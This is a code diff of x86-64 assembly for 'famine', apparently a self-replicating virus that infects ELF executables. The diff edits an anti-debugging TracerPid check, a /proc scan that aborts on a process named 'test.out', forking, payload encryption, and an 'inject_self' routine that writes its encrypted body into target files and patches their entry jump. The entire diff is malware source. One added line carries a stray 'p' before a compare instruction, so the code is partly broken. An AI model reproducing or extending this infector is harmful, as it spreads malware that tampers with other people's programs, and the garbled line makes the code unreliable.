@@ -39,7 +39,7 @@ loop .loop_status
 .check_trcr:
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-jne _exx_pop
+;jne _exx_pop
 
 
 
@@ -83,21 +83,24 @@ jne _exx_pop
 	jne .nextfile_proc
 
 
+
+;compute commfile path
 lea r11, [rel pdir]
-xor rsi, rsi
+xor r10, r10
 
 .dirname_proc:
+	lea rsi, STACK(famine.commpath)
 	mov al, byte[r11]
-	mov byte[rel commpath + rsi], al
-	inc rsi
-	cmp rsi, 6
+	mov byte[rsi + r10], al
+	inc r10
 	inc r11
+	cmp r10, 6
 	jb .dirname_proc
 
 .filename_proc:
 	mov al, byte[rdi]
-	mov byte[rel commpath + rsi], al
-	inc rsi
+	mov byte[rsi + r10], al
+	inc r10
 	inc rdi
 	cmp byte[rdi], 0
 	jne .filename_proc
@@ -106,36 +109,38 @@ lea r11, [rel pname]
 mov rdx, 0
 .commfile:
 	mov al, byte[r11]
-	mov byte[rel commpath + rsi], al
+	mov byte[rsi + r10], al
 	inc r11
-	inc rsi
+	inc r10
 	inc rdx
 	cmp rdx, 5
 	jne .commfile
-	mov byte[rel commpath + rsi], 0
+	mov byte[rsi + r10], 0
 
-
+;open the commfile
+	push rsi
+	xor rsi, rsi
 	mov rax, _open
-	lea rdi, [rel commpath]
+	lea rdi, STACK(famine.commpath)
 	mov rdx, O_RDWR
 	syscall
+	pop rsi
 	test eax, eax
 	jl .nextfile_proc
 
+;read the commfile
 	mov rdi, rax
 	mov rax, _read
-	lea rsi, [rel thename]
+	lea rsi, STACK(famine.commpath)
 	mov rdx, 90
 	syscall
 	test eax, eax
 	jl .close_proc
 	mov byte[rsi + rax - 1], 0x0
-	push rdi
 	lea rdi, [rel forbidden]
 	call .strcmp
 	cmp rax, 0
-	je _exx_pop
-	pop rdi
+	je _exx
 	.close_proc:
 	mov rax, _close
 	syscall
@@ -168,16 +173,15 @@ mov rdx, 0
 
 
 .OUI:
-
 jmp .enc_start
 DECYPHER
 
 
 .enc_start:
-;	mov rax, _fork
-;	syscall
-;	cmp rax, 0
-;	jne _exx_pop
+	mov rax, _fork
+	syscall
+p	cmp rax, 0
+	jne _exx_pop
 
 .get_rand_key:
 	lea rdi, [rel random]
@@ -403,8 +407,10 @@ inject_self:
 		dec rdx
 		cmp rdx, 0
 		jg .loading_v
-	
+
+	push r12
 	CYPHER
+	pop r12
 
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	lea rsi, STACK(famine.tocypher)
@@ -504,7 +510,7 @@ inject_self:
 	mov rdi, STACK(famine.file_fd)
 	lea rsi, STACK(famine.jmp)
 	mov rdx, 5
-	sub rax, 14  ; offset between _end:  and jump .exit
+	sub rax, RETURN_JUMP_OFFSET  ; offset between _end:  and jump .exit
 	mov r10, rax ; EOF From last call to lseek
 	mov rax, _pwrite
 	syscall
@@ -526,8 +532,6 @@ pfile			db			"/proc/self/status",0
 pdir			db			"/proc/", 0, 0, 0, 0
 pname			db			"/comm"
 forbidden		db			"test.out", 0
-commpath		times	100		db	0
-thename			times	100		db	0
 famine_entry	dq			_start
 
 _exx_pop:
@@ -538,5 +542,4 @@ jmp .exit	; at source execution of famine this will exit. when written to target
 		mov rax, _exit
 		mov rdi, 0
 		syscall
-
 _end:
